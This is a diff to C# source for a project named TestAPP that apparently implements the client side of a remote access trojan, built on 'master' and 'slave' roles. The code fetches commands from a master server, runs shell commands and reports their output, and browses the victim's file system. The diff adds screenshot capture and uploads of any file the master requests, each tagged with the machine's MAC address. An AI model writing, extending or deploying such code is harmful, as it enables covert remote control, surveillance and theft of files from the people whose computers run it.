@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Linq;
@@ -33,17 +33,24 @@ namespace TestAPP
         {
             Console.WriteLine("[+] Executing SHELL Command : " + command);
             String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress, command);
-            WebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
+            HTTPWebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
         }
 
         static void getScreenShot(SystemInfo sysInfo, String command)
         {
             Console.WriteLine("[+] Taking Screenshot for Master");
+            ScreenshotUtil.CaptureMyScreen(sysInfo.macAddress);
         }
 
         static void uploadFileToMaster(SystemInfo sysInfo, String command)
         {
             Console.WriteLine("[+] Uploading File to Master");
+
+            command = command.Replace("/", "\\");
+
+            String url = Constants.API_SLAVE_FILE_RESPONSE_URL + "?mac=" + sysInfo.macAddress;
+            HTTPWebClient.sendFileToServer(url, command);
+
         }
 
         static void browseFileSystem(SystemInfo sysInfo, String command)
@@ -53,7 +60,7 @@ namespace TestAPP
             String payload = FileSystemUtil.getFilesNFolders(sysInfo, command);
             Console.WriteLine("Payload is ");
             Console.WriteLine(payload);
-            WebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
+            HTTPWebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
         }
 
         static void connectToMaster(SystemInfo sysInfo)
@@ -61,7 +68,7 @@ namespace TestAPP
             JSONHolder json = new JSONHolder();
             String commandJSON = getCommandJSONFromSysInfo(sysInfo);
             Console.WriteLine("[+] Getting Command From Master...");
-            String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
+            String serverResponse = HTTPWebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
             Console.WriteLine("Server Response is ");
             Console.WriteLine(serverResponse);
 
